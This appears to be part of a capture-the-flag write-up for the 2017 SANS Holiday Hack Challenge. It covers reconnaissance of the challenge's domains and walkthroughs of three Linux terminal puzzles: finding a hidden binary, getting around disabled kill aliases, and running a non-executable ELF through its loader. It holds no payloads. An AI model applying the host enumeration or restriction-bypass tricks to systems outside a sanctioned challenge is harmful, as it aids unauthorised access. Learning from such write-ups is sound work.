<h3 id="orga2e658d">Certificate Transparency Logs</h3>
<div class="outline-text-3" id="text-orga2e658d">
<p>
Next, let's turn our attention to the holidayhackchallenge.com
domain. Last year, there were some new hosts that appeared under this
domain (e.g. quest2016.holidayhackchallenge.com). Brute-forcing this
will likely not get us very far, so let's try a different approach:
certificate transparency logs. Many certificate authorities maintain
transparency systems, so that issued certificates can be publicly
reviewd. Symantec, for instance, has a free tool that will search the
logs of several certificate authorities:
</p>


<div class="figure">
<p><img src="./images/recon_crypto_report.png" alt="recon_crypto_report.png" />
</p>
<p><span class="figure-number">Figure 3: </span>Symantec Crypto Report for holidayhackchallenge.com</p>
</div>

<p>
Searching for holidayhackchallenge.com reveals the following
certificates that don't look familiar:
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />

<col  class="org-right" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Common Name</th>
<th scope="col" class="org-left">Subject Alternate Names (SANs)</th>
<th scope="col" class="org-right">IP</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">2017.holidayhackchallenge.com</td>
<td class="org-left">2017, puzzler2017</td>
<td class="org-right">35.196.67.150</td>
</tr>

<tr>
<td class="org-left">docker2017.holidayhackchallenge.com</td>
<td class="org-left">&#xa0;</td>
<td class="org-right">35.190.163.207</td>
</tr>

<tr>
<td class="org-left">chat.holidayhackchallenge.com</td>
<td class="org-left">&#xa0;</td>
<td class="org-right">35.196.73.180</td>
</tr>
</tbody>
</table>
</div>
</div>

<div id="outline-container-org99da2a9" class="outline-3">
<h3 id="org99da2a9">Monitoring</h3>
<div class="outline-text-3" id="text-org99da2a9">
<p>
None of the 3 servers listed above are currently accessible on port 80
or 443 (HTTP and HTTPS). We setup some monitoring using a free online
service (uptimerobot.com). Every 5 minutes, it would try to connect to
HTTP and HTTPs on the 3 servers listed above. Once the systems become
available, it will text us and post a message to our Slack channel.
</p>

<p>
Once that happens, the hack is on, and we'll be ready to hit the
ground running.
</p>
</div>
</div>

<div id="outline-container-orgfd425cb" class="outline-3">
<h3 id="orgfd425cb">And Then Things Changed&#x2026;</h3>
<div class="outline-text-3" id="text-orgfd425cb">
<p>
On December 11th, this setup was changed, and a lot of hosts were
removed from DNS. We believe that the systems were reconfigured to
only be accessible from private IP space.
</p>

<p>
The systems where the configuration changed are marked in italics in the table below.
</p>
</div>
</div>

<div id="outline-container-orgf1236ba" class="outline-3">
<h3 id="orgf1236ba">Recon Summary</h3>
<div class="outline-text-3" id="text-orgf1236ba">
<p>
We can use the following indicators to search any clues we're later provided with:
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Indicator</th>
<th scope="col" class="org-left">Type</th>
<th scope="col" class="org-left">Source</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">northpolechristmastown.com</td>
<td class="org-left">Domain</td>
<td class="org-left">Reverse WHOIS</td>
</tr>

<tr>
<td class="org-left">holidayhackchallenge.com</td>
<td class="org-left">Domain</td>
<td class="org-left">2016 Hack</td>
</tr>

<tr>
<td class="org-left">nppd.northpolechristmastown.com</td>
<td class="org-left">FQDN</td>
<td class="org-left">Google Search</td>
</tr>

<tr>
<td class="org-left"><i>intranet.northpolechristmastown.com</i></td>
<td class="org-left">FQDN</td>
<td class="org-left">DNS Brute Force</td>
</tr>

<tr>
<td class="org-left"><i>files.northpolechristmastown.com</i></td>
<td class="org-left">FQDN</td>
<td class="org-left">DNS Brute Force</td>
</tr>

<tr>
<td class="org-left">dev.northpolechristmastown.com</td>
<td class="org-left">FQDN</td>
<td class="org-left">DNS Brute Force</td>
</tr>

<tr>
<td class="org-left"><i>admin.northpolechristmastown.com</i></td>
<td class="org-left">FQDN</td>
<td class="org-left">DNS Brute Force</td>
</tr>

<tr>
<td class="org-left"><i>mail.northpolechristmastown.com</i></td>
<td class="org-left">FQDN</td>
<td class="org-left">DNS Brute Force</td>
</tr>

<tr>
<td class="org-left"><i>emi.northpolechristmastown.com</i></td>
<td class="org-left">FQDN</td>
<td class="org-left">DNS Brute Force</td>
</tr>

<tr>
<td class="org-left"><i>ewa.northpolechristmastown.com</i></td>
<td class="org-left">FQDN</td>
<td class="org-left">DNS Brute Force</td>
</tr>

<tr>
<td class="org-left">2017.holidayhackchallenge.com</td>
<td class="org-left">FQDN</td>
<td class="org-left">Cert Transparency</td>
</tr>

<tr>
<td class="org-left">puzzler2017.holidayhackchallenge.com</td>
<td class="org-left">FQDN</td>
<td class="org-left">Cert SAN</td>
</tr>

<tr>
<td class="org-left">docker2017.holidayhackchallenge.com</td>
<td class="org-left">FQDN</td>
<td class="org-left">Cert Transparency</td>
</tr>

<tr>
<td class="org-left">chat.holidayhackchallenge.com</td>
<td class="org-left">FQDN</td>
<td class="org-left">Cert Transparency</td>
</tr>

<tr>
<td class="org-left">35.185.43.23</td>
<td class="org-left">IP</td>
<td class="org-left">DNS (files)</td>
</tr>

<tr>
<td class="org-left">35.185.57.190</td>
<td class="org-left">IP</td>
<td class="org-left">DNS (emi)</td>
</tr>

<tr>
<td class="org-left">35.185.84.51</td>
<td class="org-left">IP</td>
<td class="org-left">DNS (dev)</td>
</tr>

<tr>
<td class="org-left">35.185.115.185</td>
<td class="org-left">IP</td>
<td class="org-left">DNS (admin, mail, ewa)</td>
</tr>

<tr>
<td class="org-left">35.190.163.207</td>
<td class="org-left">IP</td>
<td class="org-left">DNS (docker2017)</td>
</tr>

<tr>
<td class="org-left">35.196.67.150</td>
<td class="org-left">IP</td>
<td class="org-left">DNS (2017)</td>
</tr>

<tr>
<td class="org-left">35.196.73.18</td>
<td class="org-left">IP</td>
<td class="org-left">DNS (chat)</td>
</tr>

<tr>
<td class="org-left">35.196.239.128</td>
<td class="org-left">IP</td>
<td class="org-left">DNS (intranet)</td>
</tr>

<tr>
<td class="org-left">HK-47 (Star Wars Droid)</td>
<td class="org-left">Reference</td>
<td class="org-left">nppd robots.txt</td>
</tr>

<tr>
<td class="org-left">Artoo (Star Wars Droid)</td>
<td class="org-left">Reference</td>
<td class="org-left">nppd robots.txt</td>
</tr>

<tr>
<td class="org-left">Threepio (Star Wars Droid)</td>
<td class="org-left">Reference</td>
<td class="org-left">nppd robots.txt</td>
</tr>

<tr>
<td class="org-left">Sand-Crawler (Star Wars Vehicle)</td>
<td class="org-left">Reference</td>
<td class="org-left">nppd robots.txt</td>
</tr>

<tr>
<td class="org-left">North Pole Police Department</td>
<td class="org-left">Reference</td>
<td class="org-left">nppd /infractions</td>
</tr>

<tr>
<td class="org-left">Cindy Lou Who (2015 Hack)</td>
<td class="org-left">Reference</td>
<td class="org-left">nppd /infractions</td>
</tr>

<tr>
<td class="org-left">Dr. Who (2016 Hack)</td>
<td class="org-left">Reference</td>
<td class="org-left">nppd /infractions</td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
<div id="outline-container-orgc7da064" class="outline-2">
<h2 id="orgc7da064">Terminals</h2>
<div class="outline-text-2" id="text-orgc7da064">
</div>
<div id="outline-container-org0ae9163" class="outline-3">
<h3 id="org0ae9163">Winter Wonder Landing</h3>
<div class="outline-text-3" id="text-org0ae9163">
</div>
<div id="outline-container-org3436530" class="outline-4">
<h4 id="landing_question"><a id="org3436530"></a>Question</h4>
<div class="outline-text-4" id="text-landing_question">
<pre class="example">
                                 |
                               \ ' /
                             -- (*) --
                                &gt;*&lt;
                               &gt;0&lt;@&lt;
                              &gt;&gt;&gt;@&lt;&lt;*
                             &gt;@&gt;*&lt;0&lt;&lt;&lt;
                            &gt;*&gt;&gt;@&lt;&lt;&lt;@&lt;&lt;
                           &gt;@&gt;&gt;0&lt;&lt;&lt;*&lt;&lt;@&lt;
                          &gt;*&gt;&gt;0&lt;&lt;@&lt;&lt;&lt;@&lt;&lt;&lt;
                         &gt;@&gt;&gt;*&lt;&lt;@&lt;&gt;*&lt;&lt;0&lt;*&lt;
           \*/          &gt;0&gt;&gt;*&lt;&lt;@&lt;&gt;0&gt;&lt;&lt;*&lt;@&lt;&lt;
       ___\\U//___     &gt;*&gt;&gt;@&gt;&lt;0&lt;&lt;*&gt;&gt;@&gt;&lt;*&lt;0&lt;&lt;
       |\\ | | \\|    &gt;@&gt;&gt;0&lt;*&lt;0&gt;&gt;@&lt;&lt;0&lt;&lt;&lt;*&lt;@&lt;&lt;  
       | \\| | _(UU)_ &gt;((*))_&gt;0&gt;&lt;*&lt;0&gt;&lt;@&lt;&lt;&lt;0&lt;*&lt;
       |\ \| || / //||.*.*.*.|&gt;&gt;@&lt;&lt;*&lt;&lt;@&gt;&gt;&lt;0&lt;&lt;&lt;
       |\\_|_|&amp;&amp;_// ||*.*.*.*|_\\db//_               
       """"|'.'.'.|~~|.*.*.*|     ____|_
           |'.'.'.|   ^^^^^^|____|&gt;&gt;&gt;&gt;&gt;&gt;|
           ~~~~~~~~         '""""`------'

My name is Bushy Evergreen, and I have a problem for you.
I think a server got owned, and I can only offer a clue.
We use the system for chat, to keep toy production running.
Can you help us recover from the server connection shunning?


Find and run the elftalkd binary to complete this challenge.
</pre>
</div>
</div>

<div id="outline-container-org9e8a665" class="outline-4">
<h4 id="landing_how-to-find-the-terminal"><a id="org9e8a665"></a>How to find the terminal</h4>
<div class="outline-text-4" id="text-landing_how-to-find-the-terminal">
<p>
From this game: <a href="https://2017.holidayhackchallenge.com/game/7e48d6aa-4b73-4027-b23b-a6a1a3460d54">https://2017.holidayhackchallenge.com/game/7e48d6aa-4b73-4027-b23b-a6a1a3460d54</a>
</p>

<p>
Direct Link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=eb5282de-5e43-4813-8ada-5aee3cdb101e&amp;uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=eb5282de-5e43-4813-8ada-5aee3cdb101e&amp;uid=USER_ID</a>
</p>


<div class="figure">
<p><img src="./images/terminal-location-landing.png" alt="terminal-location-landing.png" />
</p>
<p><span class="figure-number">Figure 4: </span>The terminal is right on top of the tower.</p>
</div>
</div>
</div>

<div id="outline-container-org9b18182" class="outline-4">
<h4 id="landing_background-information"><a id="org9b18182"></a>Background Information</h4>
<div class="outline-text-4" id="text-landing_background-information">
<p>
We are logged in as the user <code>elf</code>. According to Bushy Green's Twitter account someone copied the wrong <code>find</code> executable onto his system.
</p>
</div>
</div>

<div id="outline-container-org675a889" class="outline-4">
<h4 id="landing_goal"><a id="org675a889"></a>Goal</h4>
<div class="outline-text-4" id="text-landing_goal">
<p>
According to the Message of the Day (MOTD) we need to find and run the <code>elftalkd</code> binary.
</p>
</div>
</div>

<div id="outline-container-org741dcc3" class="outline-4">
<h4 id="landing_hints"><a id="org741dcc3"></a>Hints</h4>
<div class="outline-text-4" id="text-landing_hints">
<p>
Bushy Evergreen on Twitter has a hint:
</p>

<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">Ugh, somebody copied over the wrong `find` executable to my system today. How am I supposed to know where find normally is?!</p>&mdash; Bushy Evergreen (@GreenestElf) <a href="https://twitter.com/GreenestElf/status/938165130906365952?ref_src=twsrc%5Etfw">December 5, 2017</a></blockquote>
</div>
</div>

<div id="outline-container-orgc7e95d2" class="outline-4">
<h4 id="landing_approach"><a id="orgc7e95d2"></a>Approach</h4>
<div class="outline-text-4" id="text-landing_approach">
<p>
To solve this challenge we need to find a valid version of <code>find</code> on the system or some other viable version to find the <code>elftalkd</code> binary.
</p>
</div>
</div>

<div id="outline-container-org78a086c" class="outline-4">
<h4 id="landing_solution"><a id="org78a086c"></a>Solution</h4>
<div class="outline-text-4" id="text-landing_solution">
<p>
First we need to test what's wrong with <code>find</code>.
</p>

<pre class="example">
elf@784e43534178:~$ find
bash: /usr/local/bin/find: cannot execute binary file: Exec format error
</pre>

<p>
It looks like <code>find</code> is located in <code>/usr/local/bin/find</code>.
<code>find</code> is a standard UNIX utility and is not normally located in /usr/local so this output is unexpected.
Let's look at our PATH variable that identifies the order that executables are located in.
</p>

<pre class="example">
elf@784e43534178:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
</pre>

<p>
<code>/usr/local/bin</code> is prioritized before <code>/usr/bin</code>. Let's see if find exists in the normal <code>/usr/bin</code> location.
</p>

<pre class="example">
elf@784e43534178:~$ ls -al /usr/bin/find
-rwxr-xr-x 1 root root 221768 Feb  7  2016 /usr/bin/find
</pre>

<p>
The original <code>find</code> is still there. We can use it to find the <code>elftalkd</code> binary and execute it.
</p>

<pre class="example">
elf@784e43534178:~$ /usr/bin/find / -iname elftalkd            
/usr/bin/find: '/var/cache/ldconfig': Permission denied
/usr/bin/find: '/var/cache/apt/archives/partial': Permission denied
/usr/bin/find: '/var/lib/apt/lists/partial': Permission denied
/run/elftalk/bin/elftalkd
/usr/bin/find: '/proc/tty/driver': Permission denied
/usr/bin/find: '/root': Permission denied
elf@784e43534178:~$ /run/elftalk/bin/elftalkd

	Running in interactive mode

	--== Initializing elftalkd ==--
Initializing Messaging System!
Nice-O-Meter configured to 0.90 sensitivity.
Acquiring messages from local networks...


--== Initialization Complete ==--

      _  __ _        _ _       _ 
     | |/ _| |      | | |     | |
  ___| | |_| |_ __ _| | | ____| |
 / _ \ |  _| __/ _` | | |/ / _` |
|  __/ | | | || (_| | |   &lt; (_| |
 \___|_|_|  \__\__,_|_|_|\_\__,_|

-*&gt; elftalkd! &lt;*-
Version 9000.1 (Build 31337) 
By Santa Claus &amp; The Elf Team
Copyright (C) 2017 NotActuallyCopyrighted. No actual rights reserved.
Using libc6 version 2.23-0ubuntu9
LANG=en_US.UTF-8
Timezone=UTC

Commencing Elf Talk Daemon (pid=6021)... done!
Background daemon...
</pre>
</div>
</div>

<div id="outline-container-org31a6ca3" class="outline-4">
<h4 id="landing_alternatives"><a id="org31a6ca3"></a>Alternatives</h4>
<div class="outline-text-4" id="text-landing_alternatives">
<p>
The quick method is to iterate through using wildcards to execute the binary.
</p>

<pre class="example">
elf@784e43534178:~$ /elftalkd
bash: /elftalkd: No such file or directory
elf@784e43534178:~$ /*/elftalkd
bash: /*/elftalkd: No such file or directory
elf@784e43534178:~$ /*/*/elftalkd
bash: /*/*/elftalkd: No such file or directory
elf@784e43534178:~$ /*/*/*/elftalkd

	Running in interactive mode

	--== Initializing elftalkd ==--
Initializing Messaging System!
...
</pre>

<p>
This can also be further simplified by using the relatively new bash option <code>globstar</code>.
According to the documentation, "If set, the pattern '**' used in a filename
expansion context will match all files and zero or more directories and
subdirectories. If the pattern is followed by a ‘/’, only directories and
subdirectories match."  With this option enabled, we only need a single attempt to find
and execute the binary:
</p>

<pre class="example">
elf@784e43534178:~$ shopt -s globstar
elf@784e43534178:~$ /**/elftalkd
	Running in interactive mode
	--== Initializing elftalkd ==--
Initializing Messaging System!
...
</pre>
</div>
</div>
</div>
<div id="outline-container-org775a0cb" class="outline-3">
<h3 id="org775a0cb">Winconceivable The Cliffs Of Insanity</h3>
<div class="outline-text-3" id="text-org775a0cb">
</div>
<div id="outline-container-org718e973" class="outline-4">
<h4 id="cliffs_question"><a id="org718e973"></a>Question</h4>
<div class="outline-text-4" id="text-cliffs_question">
<pre class="example">
                ___,@
               /  &lt;
          ,_  /    \  _,
      ?    \`/______\`/
   ,_(_).  |; (e  e) ;|
    \___ \ \/\   7  /\/    _\8/_
        \/\   \'=='/      | /| /|
         \ \___)--(_______|//|//|
          \___  ()  _____/|/_|/_|
             /  ()  \    `----'
            /   ()   \
           '-.______.-'
   jgs   _    |_||_|    _
        (@____) || (____@)
         \______||______/


My name is Sparkle Redberry, and I need your help.
My server is atwist, and I fear I may yelp.
Help me kill the troublesome process gone awry.
I will return the favor with a gift before nigh.


Kill the "santaslittlehelperd" process to complete this challenge.
</pre>
</div>
</div>

<div id="outline-container-org403a15c" class="outline-4">
<h4 id="cliffs_how-to-find-the-terminal"><a id="org403a15c"></a>How to find the terminal</h4>
<div class="outline-text-4" id="text-cliffs_how-to-find-the-terminal">
<p>
From this game: <a href="https://2017.holidayhackchallenge.com/game/3e813a9c-cb34-492e-a317-0dd99c8ca2e7">https://2017.holidayhackchallenge.com/game/3e813a9c-cb34-492e-a317-0dd99c8ca2e7</a>
</p>

<p>
Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=82c16868-a96e-4e4c-955e-5b41f7c5809a&amp;uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=82c16868-a96e-4e4c-955e-5b41f7c5809a&amp;uid=USER_ID</a>
</p>


<div class="figure">
<p><img src="./images/terminal-location-cliffs.png" alt="terminal-location-cliffs.png" />
</p>
<p><span class="figure-number">Figure 5: </span>The terminal is on top of the building on the floating island right up front.</p>
</div>
</div>
</div>

<div id="outline-container-org8e0587b" class="outline-4">
<h4 id="cliffs_background-information"><a id="org8e0587b"></a>Background Information</h4>
<div class="outline-text-4" id="text-cliffs_background-information">
<pre class="example">
elf@784e43534178:~$ D="------"; echo "$D System info:"; uname -a; cat /etc/issue; echo "$D Differences from skeleton home directory:"; diff -r /etc/skel .; echo "$D Who am I?"; id; echo "$D Running procs:"; ps axf
------ System info:
Linux 784e43534178 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3 (2017-12-03) x86_64 x86_64 x86_64 GNU/Linux
Ubuntu 16.04.3 LTS \n \l
------ Differences from skeleton home directory:
diff -r /etc/skel/.bashrc ./.bashrc
81c81,84
&lt; 
---
&gt;     alias kill='true'
&gt;     alias killall='true'
&gt;     alias pkill='true'
&gt;     alias skill='true'
117a121,122
&gt; PATH=$PATH:/usr/games
&gt; cat /etc/motd
------ Who am I?
uid=1000(elf) gid=1000(elf) groups=1000(elf)
------ Running procs:
  PID TTY      STAT   TIME COMMAND
    1 pts/0    Ss     0:00 /bin/bash /sbin/init
    8 pts/0    S      0:00 /usr/bin/santaslittlehelperd
   11 pts/0    S      0:00 /sbin/kworker
   18 pts/0    S      0:01  \_ /sbin/kworker
   12 pts/0    S      0:00 /bin/bash
  994 pts/0    R+     0:00  \_ ps axf
</pre>

<p>
We see that <code>/usr/bin/santaslittlehelperd</code> is running, and we're told
that we need to kill it. However, we see that in our <code>.bashrc</code> file,
<code>kill</code> and its variants are aliased to <code>true</code>, which has no effect.
</p>
</div>
</div>

<div id="outline-container-orgdffb070" class="outline-4">
<h4 id="cliffs_goal"><a id="orgdffb070"></a>Goal</h4>
<div class="outline-text-4" id="text-cliffs_goal">
<p>
We need to <code>kill santaslittlehelperd</code>, but our <code>kill</code> has been turned ineffective.
</p>
</div>
</div>

<div id="outline-container-org33100c3" class="outline-4">
<h4 id="cliffs_hints"><a id="org33100c3"></a>Hints</h4>
<div class="outline-text-4" id="text-cliffs_hints">
<p>
Sparkle Redberry on Twitter has some hints:
</p>

<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">Dear <a href="https://twitter.com/hashtag/lazyweb?src=hash&amp;ref_src=twsrc%5Etfw">#lazyweb</a>: How do I fix a malicious alias on my Linux box? It seems to be stopping me from killing processes...</p>&mdash; Sparkle Redberry (@GlitteryElf) <a href="https://twitter.com/GlitteryElf/status/938539753372237824?ref_src=twsrc%5Etfw">December 6, 2017</a></blockquote>
<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">I tried `man alias`, but that doesn&#39;t even exist. It looks like maybe it&#39;s a built-in to bash itself?</p>&mdash; Sparkle Redberry (@GlitteryElf) <a href="https://twitter.com/GlitteryElf/status/938540163726061568?ref_src=twsrc%5Etfw">December 6, 2017</a></blockquote>
<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">Update: I read into `man bash`, and I even found a section on ALIASES (starting with &quot;Aliases allow a string to be substituted for a word when it is used as the first word of a simple command[...]&quot; but I couldn&#39;t even make it 40 words in before I got all cross-eyed.</p>&mdash; Sparkle Redberry (@GlitteryElf) <a href="https://twitter.com/GlitteryElf/status/938540426088214528?ref_src=twsrc%5Etfw">December 6, 2017</a></blockquote>
</div>
</div>

<div id="outline-container-org4116a63" class="outline-4">
<h4 id="cliffs_approach"><a id="org4116a63"></a>Approach</h4>
<div class="outline-text-4" id="text-cliffs_approach">
<p>
From the <a href="http://tldp.org/LDP/abs/html/aliases.html">Bash documentation</a>:
</p>

<blockquote>
<p>
A Bash alias is essentially nothing more than a keyboard shortcut, an abbreviation, a means of avoiding typing a long command sequence.
</p>
</blockquote>

<p>
Here, however, aliases have been used to effectively disable <code>kill</code>
and its brethren. We need to figure out a way to run the real version
of <code>kill</code> instead of the aliased version. One way to do this is to use the <code>which</code> command:
</p>

<pre class="example">
elf@784e43534178:~$ which kill
/bin/kill
</pre>

<p>
Using the full path to the binary will bypass the alias, and allow us to actually run <code>kill</code>.
</p>

<pre class="example">
elf@784e43534178:~$ /bin/kill -h
Usage:
 kill [options] &lt;pid&gt; [...]
Options:
 &lt;pid&gt; [...]            send signal to every &lt;pid&gt; listed
 -&lt;signal&gt;, -s, --signal &lt;signal&gt;
			specify the &lt;signal&gt; to be sent
 -l, --list=[&lt;signal&gt;]  list all signal names, or convert one to a name
 -L, --table            list all signal names in a nice table
 -h, --help     display this help and exit
 -V, --version  output version information and exit
For more details see kill(1).
</pre>

<p>
All that's left is to determine the process ID (<code>pid</code>) of the process to be killed. We can use the <code>ps</code> command to determine this:
</p>

<pre class="example">
elf@784e43534178:~$ ps axf
  PID TTY      STAT   TIME COMMAND
    1 pts/0    Ss     0:00 /bin/bash /sbin/init
    8 pts/0    S      0:00 /usr/bin/santaslittlehelperd
   11 pts/0    S      0:00 /sbin/kworker
   18 pts/0    S      0:01  \_ /sbin/kworker
   12 pts/0    S      0:00 /bin/bash
  649 pts/0    R+     0:00  \_ ps axf
elf@784e43534178:~$ /bin/kill 8
elf@784e43534178:~$ ps axf
  PID TTY      STAT   TIME COMMAND
    1 pts/0    Ss     0:00 /bin/bash /sbin/init
   12 pts/0    S      0:00 /bin/bash
  658 pts/0    R+     0:00  \_ ps axf
</pre>

<p>
Santa's little helper is no more.
</p>
</div>
</div>

<div id="outline-container-orgc50392c" class="outline-4">
<h4 id="cliffs_solution"><a id="orgc50392c"></a>Solution</h4>
<div class="outline-text-4" id="text-cliffs_solution">
<p>
A one-liner is: <code>/usr/bin/pkill -f santaslittlehelperd</code>. <code>pkill</code> can
kill a process by name, and the <code>-f</code> argument will have it match
against the full name of the process.
</p>
</div>
</div>

<div id="outline-container-orgeefd3ef" class="outline-4">
<h4 id="cliffs_alternatives"><a id="orgeefd3ef"></a>Alternatives</h4>
<div class="outline-text-4" id="text-cliffs_alternatives">
<p>
Another approach is simply to remove the alias, by using the <code>unalias</code> command:
</p>

<pre class="example">
elf@784e43534178:~$ unalias kill
elf@784e43534178:~$ ps axf
  PID TTY      STAT   TIME COMMAND
    1 pts/0    Ss     0:00 /bin/bash /sbin/init
    8 pts/0    S      0:00 /usr/bin/santaslittlehelperd
   11 pts/0    S      0:00 /sbin/kworker
   18 pts/0    S      0:00  \_ /sbin/kworker
   12 pts/0    S      0:00 /bin/bash
   31 pts/0    R+     0:00  \_ ps axf
elf@784e43534178:~$ kill 8
elf@784e43534178:~$ ps axf
  PID TTY      STAT   TIME COMMAND
    1 pts/0    Ss     0:00 /bin/bash /sbin/init
   12 pts/0    S      0:00 /bin/bash
   36 pts/0    R+     0:00  \_ ps axf
</pre>

<p>
Alternatively, you could run <code>bash</code> with the <code>--norc</code> flag, which
prevents it from reading and executing the <code>~/.bashrc</code> file where the
aliases are added.
</p>

<p>
One more approach is to call the command you want with a backslash.
</p>

<pre class="example">
elf@784e43534178:~$ \kill 8
elf@784e43534178:~$ ps axf
  PID TTY      STAT   TIME COMMAND
    1 pts/0    Ss     0:00 /bin/bash /sbin/init
   12 pts/0    S      0:00 /bin/bash
   36 pts/0    R+     0:00  \_ ps axf
</pre>

<p>
Or call the command in quotes.
</p>

<pre class="example">
elf@784e43534178:~$ "kill" 8
elf@784e43534178:~$ ps axf
  PID TTY      STAT   TIME COMMAND
    1 pts/0    Ss     0:00 /bin/bash /sbin/init
   12 pts/0    S      0:00 /bin/bash
   36 pts/0    R+     0:00  \_ ps axf
</pre>
</div>
</div>

<div id="outline-container-org104efde" class="outline-4">
<h4 id="cliffs_common-pitfalls"><a id="org104efde"></a>Common Pitfalls</h4>
<div class="outline-text-4" id="text-cliffs_common-pitfalls">
<p>
The fact that <code>kill</code> was aliased to <code>true</code> was problematic, because
<code>true</code> never returns any output. Thus, it would look like the <code>kill</code>
command worked, but the process would still be running. Running
something like <code>kill -h</code> would reveal that <code>kill</code> was not being run
correctly, since the help output would not be displayed.
</p>
</div>
</div>
</div>
<div id="outline-container-org9a23438" class="outline-3">
<h3 id="org9a23438">Cryokinetic Magic</h3>
<div class="outline-text-3" id="text-org9a23438">
</div>
<div id="outline-container-org6499e0f" class="outline-4">
<h4 id="cryokinetic_question"><a id="org6499e0f"></a>Question</h4>
<div class="outline-text-4" id="text-cryokinetic_question">
<pre class="example">
                     ___
                    / __'.     .-"""-.
              .-""-| |  '.'.  / .---. \
             / .--. \ \___\ \/ /____| |
            / /    \ `-.-;-(`_)_____.-'._
           ; ;      `.-" "-:_,(o:==..`-. '.         .-"-,
           | |      /       \ /      `\ `. \       / .-. \
           \ \     |         Y    __...\  \ \     / /   \/
     /\     | |    | .--""--.| .-'      \  '.`---' /
     \ \   / /     |`        \'   _...--.;   '---'`
      \ '-' / jgs  /_..---.._ \ .'\\_     `.
       `--'`      .'    (_)  `'/   (_)     /
                  `._       _.'|         .'
                     ```````    '-...--'`

My name is Holly Evergreen, and I have a conundrum.
I broke the candy cane striper, and I'm near throwing a tantrum.
Assembly lines have stopped since the elves can't get their candy cane fix.
We hope you can start the striper once again, with your vast bag of tricks.


Run the CandyCaneStriper executable to complete this challenge.
</pre>
</div>
</div>

<div id="outline-container-org9ce3ce4" class="outline-4">
<h4 id="cryokinetic_how-to-find-the-terminal"><a id="org9ce3ce4"></a>How to find the terminal</h4>
<div class="outline-text-4" id="text-cryokinetic_how-to-find-the-terminal">
<p>
From this game: <a href="https://2017.holidayhackchallenge.com/game/a1f7ac49-8210-436b-9e25-0c19f9ebfe02">https://2017.holidayhackchallenge.com/game/a1f7ac49-8210-436b-9e25-0c19f9ebfe02</a>
</p>

<p>
Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=da6d34d1-012b-420b-a7d5-369914353578&amp;uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=da6d34d1-012b-420b-a7d5-369914353578&amp;uid=USER_ID</a>
</p>


<div class="figure">
<p><img src="./images/terminal-location-cryokinetic.png" alt="terminal-location-cryokinetic.png" />
</p>
<p><span class="figure-number">Figure 6: </span>The terminal is on top of the ice shanty.</p>
</div>
</div>
</div>

<div id="outline-container-org2fd842c" class="outline-4">
<h4 id="cryokinetic_background-information"><a id="org2fd842c"></a>Background Information</h4>
<div class="outline-text-4" id="text-cryokinetic_background-information">
<p>
TODO
</p>
</div>
</div>

<div id="outline-container-org7ffd7da" class="outline-4">
<h4 id="cryokinetic_goal"><a id="org7ffd7da"></a>Goal</h4>
<div class="outline-text-4" id="text-cryokinetic_goal">
<p>
We need to run the <code>CandyCaneStriper</code> program. Upon initial inspection we discover that <code>/usr/bin/chmod</code> is empty and <code>CandyCaneStriper</code> has no execution flags set.
</p>
</div>
</div>

<div id="outline-container-org4cc2b8c" class="outline-4">
<h4 id="cryokinetic_hints"><a id="org4cc2b8c"></a>Hints</h4>
<div class="outline-text-4" id="text-cryokinetic_hints">
<p>
<a href="https://twitter.com/GreenesterElf">Holly Evergreen on Twitter has a hint</a>
</p>
<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">Update: LD_PRELOAD is awesome, but it doesn&#39;t help in this situation. <a href="https://t.co/gkF690pdAJ">https://t.co/gkF690pdAJ</a> looks like the right approach, but it&#39;s not working on this system for some reason. Ugh, I step away from this for a bit and check with others. I&#39;m too frustrated.</p>&mdash; Holly Evergreen (@GreenesterElf) <a href="https://twitter.com/GreenesterElf/status/938544194070634496?ref_src=twsrc%5Etfw">December 6, 2017</a></blockquote>

<p>
Following the link describes a familiar situation:
</p>

<blockquote>
<p>
Is there a way to run an executable binary file under Linux which does not have the execute bit set?  chmod +x is not an option.
</p>
</blockquote>
</div>
</div>
<div id="outline-container-org8937fe6" class="outline-4">
<h4 id="cryokinetic_approach"><a id="org8937fe6"></a>Approach</h4>
<div class="outline-text-4" id="text-cryokinetic_approach">
<p>
Let's take a look at the executable we're dealing with:
</p>

<pre class="example">
elf@f76931683b1e:~$ ls -l CandyCaneStriper 
-rw-r--r-- 1 root root 45224 Dec 15 19:59 CandyCaneStriper
elf@f76931683b1e:~$ file CandyCaneStriper 
CandyCaneStriper: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=bfe4ffd88f30e6970feb7e3341ddbe579e9ab4b3, stripped
</pre>

<p>
Much like how Python and Perl scripts have interpreters, ELF binaries also have interpreters. For our target, <code>file</code> tells us that our interpreter is <code>/lib64/ld-linux-x86-64.so.2</code>.
</p>

<pre class="example">
elf@d5823d933b5d:~$ /lib64/ld-linux-x86-64.so.2
Usage: ld.so [OPTION]... EXECUTABLE-FILE [ARGS-FOR-PROGRAM...]
You have invoked `ld.so', the helper program for shared library executables.
This program usually lives in the file `/lib/ld.so', and special directives
in executable files using ELF shared libraries tell the system's program
loader to load the helper program from this file.  This helper program loads
the shared libraries needed by the program executable, prepares the program
to run, and runs it.  You may invoke this helper program directly from the
command line to load and run an ELF executable file; this is like executing
